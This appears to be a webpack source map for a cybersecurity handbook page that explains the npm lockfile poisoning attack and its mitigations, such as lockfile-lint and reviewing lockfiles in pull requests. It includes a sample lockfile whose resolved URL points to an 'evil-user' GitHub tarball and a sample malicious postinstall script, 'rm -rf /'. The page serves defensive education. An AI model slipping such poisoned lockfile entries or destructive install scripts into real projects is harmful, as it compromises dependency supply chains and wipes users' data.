{"version":3,"sources":["webpack:///../src/attacks_explained/lockfile.mdx"],"names":["_frontmatter","layoutProps","MDXLayout","DefaultLayout","MDXContent","components","props","mdxType","parentName","isMDXComponent"],"mappings":"mfAMO,IAAMA,EAAe,Q,oNAE5B,IAKMC,EAAc,CAClBD,gBAEIE,EAAYC,IACH,SAASC,EAAT,GAGZ,IAFDC,EAEC,EAFDA,WACGC,E,oIACF,mBACD,OAAO,YAACJ,EAAD,KAAeD,EAAiBK,EAAhC,CAAuCD,WAAYA,EAAYE,QAAQ,cAG5E,iBAAQ,CACN,GAAM,mBADR,mBAGA,iBAAQ,CACN,GAAM,cADR,cAGA,oFAAmE,mBAAGC,WAAW,KAAQ,CACrF,KAAQ,wGADuD,0BAAnE,OAE2C,mBAAGA,WAAW,KAAQ,CAC7D,KAAQ,kCAD+B,aAF3C,KAKA,yHAAwG,mBAAGA,WAAW,KAAQ,CAC1H,KAAQ,2BAD4F,+BAAxG,KAGA,qLAAoK,0BAAYA,WAAW,KAAvB,qBAApK,QAA0O,0BAAYA,WAAW,KAAvB,aAA1O,MACA,0VACA,0CAAyB,0BAAYA,WAAW,KAAvB,qBAAzB,KACA,uBAAK,sBAAMA,WAAW,OAAU,CAC5B,UAAa,kBADZ,qfAqBL,kEAAiD,0BAAYA,WAAW,KAAvB,YAAjD,QAA8G,0BAAYA,WAAW,KAAvB,aAA9G,+CACA,uBAAK,sBAAMA,WAAW,OAAU,CAC5B,UAAa,kBADZ,weAqBL,yDAAwC,0BAAYA,WAAW,KAAvB,qBAAxC,oIACA,2FAA0E,0BAAYA,WAAW,KAAvB,sBAC1E,uBAAK,sBAAMA,WAAW,OAAU,IAA3B,qDAIL,iBAAQ,CACN,GAAM,gBADR,gBAGA,gHACA,iBAAQ,CACN,GAAM,cADR,cAGA,sBACE,kBAAIA,WAAW,MAAf,2CACA,kBAAIA,WAAW,MAAf,yDAA8E,0BAAYA,WAAW,MAAvB,iBAA0D,mBAAKA,WAAW,MAAK,sBAAMA,WAAW,OAAU,CAClL,UAAa,kBAD0I,mGAI7J,kBAAIA,WAAW,MAAf,sFACA,kBAAIA,WAAW,MAAf,sFAEF,iBAAQ,CACN,GAAM,QADR,QAGA,sBACE,kBAAIA,WAAW,MAAK,mBAAGA,WAAW,MAAS,CACvC,KAAQ,oDADQ,yFAGpB,kBAAIA,WAAW,MAAK,mBAAGA,WAAW,MAAS,CACvC,KAAQ,wGADQ,yFAGpB,kBAAIA,WAAW,MAAK,mBAAGA,WAAW,MAAS,CACvC,KAAQ,oGADQ,qG,kNAQ1BJ,EAAWK,gBAAiB","file":"component---src-attacks-explained-lockfile-mdx-ab3b08124f3f0377cffa.js","sourcesContent":["import * as React from 'react'\n  /* @jsx mdx */\nimport { mdx } from '@mdx-js/react';\n/* @jsx mdx */\n\nimport DefaultLayout from \"/Users/ulisesgascon/Desktop/WORKSPACE/GS-Projects/cybersecurity-handbook/node_modules/gatsby-theme-docz/src/base/Layout.js\";\nexport const _frontmatter = {};\n\nconst makeShortcode = name => function MDXDefaultShortcode(props) {\n  console.warn(\"Component \" + name + \" was not imported, exported, or provided by MDXProvider as global scope\");\n  return <div {...props} />;\n};\n\nconst layoutProps = {\n  _frontmatter\n};\nconst MDXLayout = DefaultLayout;\nexport default function MDXContent({\n  components,\n  ...props\n}) {\n  return <MDXLayout {...layoutProps} {...props} components={components} mdxType=\"MDXLayout\">\n\n\n    <h1 {...{\n      \"id\": \"lockfile-attack\"\n    }}>{`Lockfile Attack`}</h1>\n    <h2 {...{\n      \"id\": \"the-attack\"\n    }}>{`The Attack`}</h2>\n    <p>{`This attack is very specific to the Nodejs ecosystem and it `}<a parentName=\"p\" {...{\n        \"href\": \"https://snyk.io/blog/why-npm-lockfiles-can-be-a-security-blindspot-for-injecting-malicious-modules/\"\n      }}>{`was discovered in 2019`}</a>{` by `}<a parentName=\"p\" {...{\n        \"href\": \"https://twitter.com/liran_tal\"\n      }}>{`Liran Tal`}</a>{`.`}</p>\n    <p>{`It is quite common to include external dependencies in Nodejs. The ecosystem is heavily based in `}<a parentName=\"p\" {...{\n        \"href\": \"https://www.npmjs.com/\"\n      }}>{`NPM Registry (+1M packages)`}</a>{`.`}</p>\n    <p>{`Most projects manage their dependencies using the Npm official client or Yarn. A few years ago, both tools introduced the lockfile concept to the ecosystem (`}<inlineCode parentName=\"p\">{`package-lock.json`}</inlineCode>{` and `}<inlineCode parentName=\"p\">{`yarn.lock`}</inlineCode>{`).`}</p>\n    <p>{`If the project has a lockfile available, the package manager will install the dependencies from the lockfile as the primary source of truth. This lead us to a new vector where a malicious actor can submit a poisonous dependency through the lockfile as most of maintainers don't review the lockfiles during the PR Reviews.`}</p>\n    <p>{`This is a regular `}<inlineCode parentName=\"p\">{`package-lock.json`}</inlineCode>{`.`}</p>\n    <pre><code parentName=\"pre\" {...{\n        \"className\": \"language-json\"\n      }}>{`{\n  \"name\": \"my-project\",\n  \"version\": \"0.0.1\",\n  \"lockfileVersion\": 1,\n  \"requires\": true,\n  \"dependencies\": {\n    \"@babel/code-frame\": {\n      \"version\": \"7.8.3\",\n      \"resolved\": \"https://registry.npmjs.org/@babel/code-frame/-/code-frame-7.8.3.tgz\",\n      \"integrity\": \"sha512-a9gxpmdXtZEInkCSHUJDLHZVBgb1QS0jhss4cPP93EW7s+uC5bikET2twEF3KV+7rDblJcmNvTR7VJejqd2C2g==\",\n      \"dev\": true,\n      \"requires\": {\n        \"@babel/highlight\": \"^7.8.3\"\n      }\n    }\n    //...\n  }\n}\n`}</code></pre>\n    <p>{`The malicious attack takes place when the `}<inlineCode parentName=\"p\">{`resolved`}</inlineCode>{` and `}<inlineCode parentName=\"p\">{`integrity`}</inlineCode>{` are not corresponding to official sources:`}</p>\n    <pre><code parentName=\"pre\" {...{\n        \"className\": \"language-json\"\n      }}>{`{\n  \"name\": \"my-project\",\n  \"version\": \"0.0.1\",\n  \"lockfileVersion\": 1,\n  \"requires\": true,\n  \"dependencies\": {\n    \"@babel/code-frame\": {\n      \"version\": \"7.8.3\",\n      \"resolved\": \"https://github.com/evil-user/code-frame/tarball/master\",\n      \"integrity\": \"sha512-VT0ZI6kZRdTh8YyJw3SMbYm/u+NqfsAxEpWO0Pf9sq8/e94WxxOpPKx9FR1FlyCtOVDNOQ+8ntlqFxiRc+r5qA==\",\n      \"dev\": true,\n      \"requires\": {\n        \"@babel/highlight\": \"^7.8.3\"\n      }\n    }\n    //...\n  }\n}\n`}</code></pre>\n    <p>{`So the risk in this case is that `}<inlineCode parentName=\"p\">{`@babel/code-frame`}</inlineCode>{` is not installed from the NPM registry. This can lead to many attacks based on the npm lifecycle (pre-install, post-install...)`}</p>\n    <p>{`As an example of malicious script added in the poisoned version of `}<inlineCode parentName=\"p\">{`@babel/code-frame`}</inlineCode></p>\n    <pre><code parentName=\"pre\" {...{}}>{`\"scripts\": {\n   \"postinstall\": \"rm -rf /\",\n}\n`}</code></pre>\n    <h2 {...{\n      \"id\": \"the-solution\"\n    }}>{`The solution`}</h2>\n    <p>{`There are no definitive solutions to avoid this attack, but it can be highly mitigated.`}</p>\n    <h2 {...{\n      \"id\": \"mitigation\"\n    }}>{`Mitigation`}</h2>\n    <ul>\n      <li parentName=\"ul\">{`Always review the lockfiles in the PRs.`}</li>\n      <li parentName=\"ul\">{`Use a tool to check the lockfile sources enables like `}<inlineCode parentName=\"li\">{`lockfile-lint`}</inlineCode><pre parentName=\"li\"><code parentName=\"pre\" {...{\n            \"className\": \"language-bash\"\n          }}>{`npx lockfile-lint --path yarn.lock --type yarn --validate-https --allowed-hosts yarnpkg.org\n`}</code></pre></li>\n      <li parentName=\"ul\">{`Include the validation tools in the CI process (testing phase and security checks)`}</li>\n      <li parentName=\"ul\">{`Optional: You can include the sources validation with Git Hooks too (using Husky)`}</li>\n    </ul>\n    <h3 {...{\n      \"id\": \"refs\"\n    }}>{`Refs`}</h3>\n    <ul>\n      <li parentName=\"ul\"><a parentName=\"li\" {...{\n          \"href\": \"https://snyk.io/blog/what-is-package-lock-json/\"\n        }}>{`Snyk | What is package lock json and how a lockfile works for yarn and npm packages?`}</a></li>\n      <li parentName=\"ul\"><a parentName=\"li\" {...{\n          \"href\": \"https://snyk.io/blog/why-npm-lockfiles-can-be-a-security-blindspot-for-injecting-malicious-modules/\"\n        }}>{`Snyk | Why npm lockfiles can be a security blindspot for injecting malicious modules`}</a></li>\n      <li parentName=\"ul\"><a parentName=\"li\" {...{\n          \"href\": \"https://medium.com/coinmonks/everything-you-wanted-to-know-about-package-lock-json-b81911aa8ab8\"\n        }}>{`Medium | Everything You Wanted To Know About package-lock.json But Were Too Afraid To Ask`}</a></li>\n    </ul>\n\n    </MDXLayout>;\n}\n;\nMDXContent.isMDXComponent = true;\n      "],"sourceRoot":""}